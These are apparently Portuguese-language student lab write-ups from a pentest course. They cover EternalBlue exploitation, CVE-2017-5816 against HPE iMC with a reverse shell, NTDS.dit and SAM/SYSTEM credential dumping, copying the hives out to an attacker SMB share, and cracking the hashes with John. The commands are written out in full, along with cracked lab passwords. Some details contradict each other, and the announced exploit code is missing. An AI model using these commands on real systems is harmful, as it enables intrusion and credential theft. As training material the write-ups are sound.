
### SEMANA 08 - HASHES E SENHAS - WINDOWS

### LAB - Quebra de Hash Legacy

---

**ID do Lab:** `75362ef237880523086247dc16ca285f97551a77`

**Pergunta:** Durante um pentest, encontramos um hash no backup de um host windows muito antigo, você consegue decifrar o hash? (`F2089C253BE79913AAD3B435B51404EE`)

**Resposta:** O hash fornecido possui 32 caracteres hexadecimais. Tratando-se de um ambiente Windows, este formato corresponde tipicamente ao algoritmo **NTLM** (NT LAN Manager). Utilizamos um serviço de banco de dados de hashes online (`hashes.com`) para verificar se essa string já havia sido quebrada anteriormente (Rainbow Table/Lookup).

**Comando Utilizado:**

Bash

```
# Criação do arquivo
echo "F2089C253BE79913AAD3B435B51404EE" > hashlm.txt

# Quebra com formato LM explícito
john hashlm.txt --format=LM --wordlist=/usr/share/wordlists/rockyou.txt
```

![](../assets/Pasted%20image%2020251123231636.png)

**Resultado Obtido:**

- **Hash:** `F2089C253BE79913AAD3B435B51404EE`
    
- **Senha Decifrada:** `4runner`
    

### Evidência (Print do Resultado)
![](../assets/Pasted%20image%2020251123230835.png)

### SEMANA 08 - PENTEST WINDOWS SERVER (ACTIVE DIRECTORY)

### RELATÓRIO TÉCNICO - MS17-010 & NTDS DUMP

---

#### 1. Fase de Exploração (EternalBlue)

**Objetivo:** Obter acesso inicial ao servidor Windows Server 2012 R2 (172.16.1.233).

**Desafio:** O exploit é instável e a rede apresentava alta latência, exigindo ajustes finos ("Tuning") no módulo do Metasploit.

Configuração do Exploit:

Utilizamos o módulo exploit/windows/smb/ms17_010_eternalblue com configurações específicas para evitar o travamento do serviço SMB e lidar com timeouts.

Bash

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.1.233
set LHOST tun0
set ConnectTimeout 60          # Aumentado para compensar a VPN
set GroomAllocations 12        # Ajuste de alocação de memória
set ProcessName spoolsv.exe    # Processo mais estável para injeção no Win2012
set VERIFY_ARCH false          # Forçar a execução
set VERIFY_TARGET false        # Forçar a execução
exploit
```

**Resultado:** Sessão Meterpreter estabelecida com privilégios de `NT AUTHORITY\SYSTEM`.
![](../assets/Pasted%20image%2020251123225933.png)


---

#### 2. Fase de Pós-Exploração (Extração de Credenciais)

**Problema:** O comando `hashdump` padrão do Meterpreter retornou todos os hashes necessários e acessou o banco de dados completo do domínio.
![](../assets/Pasted%20image%2020251123225809.png)

**Solução Alternativa:** Realizar um dump manual do banco de dados do Active Directory                   (`ntds.dit`) usando a técnica nativa **IFM (Install From Media)**.

Passo 2.1: Criação do Snapshot no Alvo

Acessamos o Shell do Windows via Meterpreter e utilizamos o utilitário ntdsutil para criar uma cópia desbloqueada do banco de dados e da chave de registro SYSTEM.

DOS

```
# Dentro do Shell (C:\>)
mkdir C:\temp_dump
ntdsutil "ac i ntds" "ifm" "create full c:\temp_dump" q q
```

Passo 2.2: Exfiltração dos Arquivos

Voltamos ao Meterpreter para baixar os arquivos gerados para a máquina atacante (Kali Linux).


```
# No Meterpreter
cd "C:\\temp_dump\\Active Directory"
download ntds.dit /home/wellerson/Desktop/Desec/ntds.dit

cd "C:\\temp_dump\\registry"
download SYSTEM /home/wellerson/Desktop/Desec/SYSTEM
```

Passo 2.3: Extração Offline (Impacket)

Com os arquivos no Kali, utilizamos o impacket-secretsdump para extrair os hashes NTLM e chaves Kerberos.


```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Evidência da Extração:**
![](../assets/Pasted%20image%2020251123225641.png)
---

#### 3. Fase de Quebra de Senhas (Cracking)

**Objetivo:** Descobrir as senhas em texto claro dos usuários `ti`, `nicolas` e `lucas` para pontuar no laboratório.

**Procedimento:**

1. Criamos um arquivo `senhas.txt` contendo os hashes NTLM extraídos.
    
2. Utilizamos o **John the Ripper** com a wordlist `rockyou.txt`.
    

**Comando Utilizado:**

Bash

```
john senhas.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado Final (Credenciais Quebradas):**

|**Usuário**|**Senha Descoberta**|
|---|---|
|**ti**|`it@LOCAL`|
|**nicolas**|`23nick#@`|
|**lucas**|`#1AriesBoss`|

### Evidência (Print do John)
![](../assets/Pasted%20image%2020251123225332.png)

### SEMANA 08 - PENTEST WINDOWS SERVER (HPE iMC)

### LAB 01 - Identificação de Vulnerabilidade (OSINT)

---

**ID do Lab:** `56386fd766fc7642373496b49924fc5c538ce448`

**Pergunta:** Utilize todas as técnicas aprendidas até o momento e analise o host: 172.30.0.103, identifique a vulnerabilidade no serviço em execução e obtenha acesso (shell) ao host. Qual o CVE do serviço vulnerável?

**Resposta:** A análise inicial de portas (Nmap) revelou a porta 8080 aberta. Ao acessar o serviço via navegador, fomos redirecionados para `/imc/login.jsf`, identificando o software como **HPE Intelligent Management Center (iMC)**. Navegando pela aplicação (especificamente na área de registro/licença), encontramos o **Serial Number** e **Product Number** expostos. Realizamos uma busca OSINT no Google com esses dados, o que nos levou a identificar a versão específica do software e sua vulnerabilidade crítica de Execução Remota de Código (RCE).

**Passo a Passo da Investigação:**

1. **Enumeração de Portas:**
    
    Bash
    
    ```
    nmap 172.30.0.103 -sV -Pn -p 8080
    ```
    
    _Resultado:_ Apache Tomcat/Coyote JSP engine 1.1.
    
2. **Reconhecimento Web:** Acessamos `http://172.30.0.103:8080` e fomos redirecionados para a tela de login do HPE iMC. Localizamos a página de informações de licença (ou similar) que vazou:
    
    - **Product Number:** `JG747AAE`
        
    - **Serial Number:** `IMCM-10CB1E600B23EC58FC3`
        
3. **OSINT & CVE Lookup:** Pesquisamos o Serial Number no Google e encontramos referências diretas ao **HPE iMC Plat 7.2** e ao exploit de **Remote Code Execution**. Consultando o Exploit-DB e bases de dados de vulnerabilidade, confirmamos o código CVE associado a essa falha.
    

**Resultado Obtido:**

- **Software:** HPE Intelligent Management Center (iMC) 7.2
    
- **Vulnerabilidade:** Java Deserialization RCE
    
- **CVE:** `CVE-2017-5816`
    

### Evidências (Prints do Processo)

**1. Identificação do Software (Login):**
![](../assets/Pasted%20image%2020251124160250.png)
**2. Vazamento de Informação (Serial Number):**
![](../assets/Pasted%20image%2020251124160304.png)
**3. Correlação OSINT (Google/Exploit-DB):**
![](../assets/Pasted%20image%2020251124160312.png)
**4. Confirmação no Lab:**![](../assets/Pasted%20image%2020251124160332.png)

### SEMANA 08 - PENTEST WINDOWS SERVER (HPE iMC)

### RELATÓRIO TÉCNICO - EXPLORAÇÃO DBMAN (CVE-2017-5816)

---

#### 1. Fase de Exploração (Custom Python Exploit)

**Objetivo:** Obter uma shell reversa estável no servidor `172.30.0.103`, contornando instabilidades de rede que inviabilizaram o uso do Metasploit.

**Vulnerabilidade:** Command Injection no serviço **Dbman** do HPE iMC (Porta 2810), identificado como `CVE-2017-5816`.

**Procedimento:**

1. **Preparação do Payload:** Criamos um executável malicioso (`shell.exe`) com o `msfvenom` e iniciamos um servidor HTTP Python (`python3 -m http.server 80`) para hospedá-lo.
    
2. **Adaptação do Exploit:** Baixamos o exploit público da CVE-2017-5816 e modificamos o payload para realizar o download e execução do nosso arquivo:
    
    - **Payload Injetado:** `cmd /c C:\Windows\Temp\shell.exe` (Assumindo download prévio ou execução direta via SMB/HTTP).
        
    - _Nota:_ A técnica utilizada envolveu forçar o servidor a buscar o arquivo na máquina atacante e executá-lo.
        

**Código do Exploit (Python):**

**Execução e Shell:** Ao rodar o script, o servidor vulnerável baixou o payload (visto no log do servidor HTTP) e conectou de volta no nosso Netcat (`nc -lnvp 443`), garantindo acesso `SYSTEM`.

### Evidência (Shell Reversa e HTTP Log)
![](../assets/Pasted%20image%2020251125001711.png)
---
![](../assets/Pasted%20image%2020251125001716.png)



#### 2.Fase de Pós-Exploração (Key do Compartilhamento)

**Objetivo:** Encontrar a "key no compartilhamento de leitura".

**Procedimento:**

1. Já dentro da shell, listamos os compartilhamentos de rede ativos na máquina para identificar pastas não-padrão.
    
    - **Comando:** `net share`
        
    - **Resultado:** Identificamos um compartilhamento atípico chamado **`read`** apontando para `C:\read`.
        

### Evidência (Net Share)

![](../assets/Pasted%20image%2020251125001820.png)

![](../assets/Pasted%20image%2020251125001841.png)


2. Navegamos até o diretório físico do compartilhamento e lemos o arquivo da flag.
    
    - **Comandos:**
        
        DOS
        
        ```
        cd C:\read
        dir
        type files.txt
        ```
        

**Resultado Obtido:**

- **Key:** `key{R3ad1ngFilesVLAB}`
    

### Evidência (Flag Capturada)

![](../assets/Pasted%20image%2020251125001848.png)


---

### SEMANA 08 - PENTEST WINDOWS SERVER (HPE iMC)

### RELATÓRIO TÉCNICO - EXTRAÇÃO MANUAL DE CREDENCIAIS (SAM/SYSTEM)

---

#### 1. Contexto e Objetivo

Objetivo: Obter as senhas em texto claro dos usuários locais CPD01, DEV01 e ADM01 para concluir os laboratórios de pós-exploração.

Cenário: Possuíamos acesso ao shell do sistema (cmd.exe), mas não tínhamos ferramentas de dump (como Meterpreter/Mimikatz) funcionando estavelmente.

Solução: Realizar a extração manual das hives de registro (SAM e SYSTEM) e exfiltrar os arquivos para processamento offline.

---

#### 2. Procedimento Técnico (Passo a Passo)

Passo 1: Backup das Hives de Registro (No Alvo)

Utilizamos o comando nativo do Windows reg save para criar cópias dos arquivos que contêm os hashes de senha (SAM) e a chave de criptografia (SYSTEM). Salvamos na pasta temporária.

**Comandos Executados:**

DOS

```
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
```
![](../assets/Pasted%20image%2020251126000028.png)
Passo 2: Configuração do Servidor de Exfiltração (No Kali)

Para retirar os arquivos do servidor sem depender de sessões instáveis, subimos um servidor SMB temporário na máquina atacante.

**Comando Executado:**

Bash

```
impacket-smbserver share . -smb2support
```
![](../assets/Pasted%20image%2020251126000052.png)
Passo 3: Exfiltração dos Arquivos (No Alvo)

Com o servidor SMB ativo, utilizamos o comando copy do Windows para enviar os arquivos salvos diretamente para o Kali.

**Comandos Executados:**

DOS
![](../assets/Pasted%20image%2020251126000044.png)
```
copy C:\Windows\Temp\sam.save \\172.20.1.82\share\sam.save
copy C:\Windows\Temp\system.save \\172.20.1.82\share\system.save
```

Passo 4: Dump dos Hashes (No Kali - Offline)

Com os arquivos sam.save e system.save em posse, utilizamos a ferramenta impacket-secretsdump para descriptografar e extrair os hashes NTLM.

**Comando Executado:**

Bash

```
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

---

#### 3. Evidências da Extração

**Extração Manual e Exfiltração (Reg Save + Copy):**

**Dump dos Hashes (Impacket):**

![](../assets/Pasted%20image%2020251126000056.png)
---

#### 4. Quebra de Senhas (Cracking) e Resultados

Com os hashes extraídos, utilizamos o **John the Ripper** para descobrir as senhas em texto claro.

**Comando:** `john cpd.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt`

**Respostas dos Laboratórios:**

| **Lab ID**    | **Usuário** | **Senha Descoberta** |
| ------------- | ----------- | -------------------- |
| **3a4525...** | **CPD01**   | `bk7cpd`             |
| **c44def...** | **DEV01**   | `dev0105`            |
| **2074df...** | **ADM01**   | `admd0458`           |

Evidência da Quebra (John the Ripper):

![](../assets/Pasted%20image%2020251125235941.png)

![](../assets/Pasted%20image%2020251126000005.png)

---


